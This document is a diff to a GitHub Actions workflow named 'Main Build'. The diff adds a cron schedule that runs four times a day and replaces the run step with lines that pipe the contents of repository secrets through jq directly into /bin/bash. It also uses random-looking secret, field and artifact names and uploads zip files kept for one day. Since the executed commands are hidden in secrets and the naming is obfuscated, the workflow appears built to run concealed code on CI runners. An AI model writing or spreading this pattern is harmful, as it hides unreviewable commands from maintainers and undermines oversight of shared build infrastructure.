@@ -2,6 +2,8 @@ name: Main Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '56 4,10,16,22 * * *'
 jobs:
   pipeline:
     runs-on: ubuntu-latest
@@ -9,15 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Invoke
         env:
-          ilv9742: ${{ secrets.ilv9742 }}
+          f2: ${{ secrets.f2 }}
         run: |
-          printf '%s' "$ilv9742" | jq -r .my24 | /bin/bash
-          printf '%s' "$v67" | jq -r .qchbm93591 | /bin/bash
+          printf '%s' "$f2" | jq -r .r78 | /bin/bash
+          printf '%s' "$lytmr8" | jq -r .u9 | /bin/bash
+          printf '%s' "$slnt1" | jq -r .fms46847 | /bin/bash
+          printf '%s' "$vsfi5803" | jq -r .z827 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
         uses: actions/upload-artifact@v4
         with:
-          name: PhzLnOuz
+          name: axLpSVBM
           path: "*.zip"
           retention-days: 1
